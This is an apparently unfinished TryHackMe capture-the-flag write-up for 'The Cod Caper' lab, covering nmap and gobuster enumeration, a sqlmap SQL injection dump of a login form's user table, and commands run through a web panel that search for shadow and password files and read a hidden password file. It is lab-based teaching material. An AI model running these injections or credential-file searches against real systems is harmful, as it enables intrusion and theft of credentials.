# The Cod Caper
> 4lch3my | June 27, 2023
-------------------
#### A guided room taking you through infiltrating and exploiting a Linux system.
#### [Room Link](https://tryhackme.com/room/thecodcaper)

## Tasks 
##### 1. Intro
  Deploy the machine with the Start Machine button, also either deploy your [Attack Box](https://tryhackme.com/access) OR Connect to [OpenVPN](https://tryhackme.com/access) and deploy your personal KALI machine.
<br>


##### 2. Host Enumeration
To start, I will use [nmap] which is default option on the personal Kali install I have. We start with a basic command
  `nmap -sC -sV -A MACHINE_IP `
The -sC flag runs scripts against open ports as well to determine if there are external/common vulnerabilities that we can use outright. The -sV probes all open ports it finds to determine if we can get the service/version information. -A uses agressive mode, so we can follow along with the commands and enumeration.
  In our NMAP results we get:

```
Starting Nmap 7.60 ( https://nmap.org ) at 2023-05-15 23:25 BST
Nmap scan report for ip-10-10-2-173.eu-west-1.compute.internal (10.10.2.173)
Host is up (0.00062s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6d:2c:40:1b:6c:15:7c:fc:bf:9b:55:22:61:2a:56:fc (RSA)
|   256 ff:89:32:98:f4:77:9c:09:39:f5:af:4a:4f:08:d6:f5 (ECDSA)
|_  256 89:92:63:e7:1d:2b:3a:af:6c:f9:39:56:5b:55:7e:f9 (EdDSA)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:B2:1D:FE:B3:AD (Unknown)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3.13
OS details: Linux 3.13
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Nmap done: 1 IP address (1 host up) scanned in 12.24 seconds
```

##### 3. Web Enumeration
Time to run gobuster to see what directorys we have on `port 80`. To do this we can run the command:`gobuster dir -u MACHINE_IP -w /usr/share/wordlists/dirb/big.txt -x php,html,txt` what will look for common files with the extensions: `php,html,txt`

```
===============================================================
Gobuster v3.0.1
===============================================================
[+] Url:            http://10.10.2.173/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,html,txt
[+] Timeout:        10s
===============================================================
2023/05/15 23:35:06 Starting gobuster
===============================================================
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.html (Status: 403)
/.htpasswd.txt (Status: 403)
/.htaccess (Status: 403)
/.htaccess.txt (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.html (Status: 403)
/administrator.php (Status: 200)
/index.html (Status: 200)
/server-status (Status: 403)
===============================================================
2023/05/15 23:35:13 Finished
===============================================================
```

##### 4. Web Exploitation

sqlmap -u http://MACHINE_IP/administrator.php --forms --dump

```
       ___
       __H__
 ___ ___[.]_____ ___ ___  {1.2.4#stable}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[*] starting at 23:39:14
[#1] form:
POST http://MACHINE_IP:80/administrator.php
POST data: username=&password=
do you want to test this form? [Y/n/q] 
> yes
Edit POST data [default: username=&password=] (Warning: blank fields detected): 
do you want to fill blank fields with random values? [Y/n] Y
...
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
...
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
...
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
...
do you want to exploit this SQL injection? [Y/n] Y
[23:40:08] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 (xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.0
[23:40:08] [INFO] fetching current database
[23:40:08] [INFO] retrieved: users
[23:40:08] [INFO] used SQL query returns 2 entries
[23:40:09] [INFO] fetching entries for table 'users' in database 'users'
[23:40:09] [INFO] retrieved: p******d
[23:40:09] [INFO] retrieved: s********s
Database: users
Table: users
[2 entries]
+------------+------------+
| username   | password   |
+------------+------------+
| s********s | s********s |
| p******d   | p******d   |
+------------+------------+
[*] shutting down at 23:40:09
```


TASK5

Log in with credentials above to /administrator.php
Run: ls
run: find / 2>>/dev/null | grep -i shadow
run: find / 2>>/dev/null | grep -i pass
run: cat /var/hidden/pass